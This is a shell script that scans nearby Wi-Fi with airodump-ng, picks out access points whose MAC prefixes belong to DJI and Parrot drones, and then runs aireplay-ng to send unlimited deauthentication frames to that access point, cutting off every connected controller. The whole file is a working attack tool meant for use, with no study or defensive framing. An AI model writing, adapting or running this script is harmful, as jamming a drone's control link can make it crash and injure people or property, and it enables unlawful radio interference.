#!/bin/sh

	ifconfig wlan0 down
	tput setaf 1;   echo "Succesfully took down wireless card.$(tput sgr 0)"
	xterm -hold -e airodump-ng -w dump wlan0 & tput setaf 3; echo "Searching for APs...$(tput sgr 0)"	# Scan for APs
	i=0
	while [ $i -eq 0 ]
	do
		apMAC=$(grep -m 1 -Eo "60:60:1F:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv) 
		if [ "$apMAC" = "" ]; then
		apMAC=$(grep -m 1 -Eo "90:03:B7:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
		fi
		if [ "$apMAC" = "" ]; then 
		apMAC=$(grep -m 1 -Eo "A0:14:3D:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
		fi
		if [ "$apMAC" = "" ]; then
		apMAC=$(grep -m 1 -Eo "00:26:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
		fi
		if [ "$apMAC" = "" ]; then
		apMAC=$(grep -m 1 -Eo "00:12:1C:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
		fi
		if [ "$apMAC" = "" ]; then
		apMAC=$(grep -m 1 -Eo "90:3A:E6:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
		fi

		apCh=$(grep -m 1 -E "$apMAC" dump-01.csv | cut -d "," -f 4)

		ap1stHalf=$(echo $apMAC | cut -c 1-9)	

		if [ "$ap1stHalf" = "60:60:1F:" ]; then # [0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" ]; then
			tput setaf 1; echo "DJI AP Found!$(tput sgr 0)"
			echo "DJI MAC: " $apMAC
			i=1
			kill $(ps -e | grep "airodump-ng" | awk '{print $1}') 		
		fi	# If MAC not found, search again
		if [ "$ap1stHalf" = "90:03:B7:" ] || [ "$ap1stHalf" = "A0:14:3D:" ] || [ "$ap1stHalf" = "00:26:7E:" ] || [ "$ap1stHalf" = "00:12:1C:" ] || [ "$ap1stHalf" = "90:3A:E6:" ]; then # [0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" ]; then
			tput setaf 1; echo "Parrot AP Found!$(tput sgr 0)"
			echo "Parrot MAC: " $apMAC
			i=1
			kill $(ps -e | grep "airodump-ng" | awk '{print $1}') 		
		fi			
	done
	echo $apCh
	iwconfig wlan0 channel $apCh
	aireplay-ng -0 0 -a $apMAC wlan0	# If MAC found, deauthenticate all devices


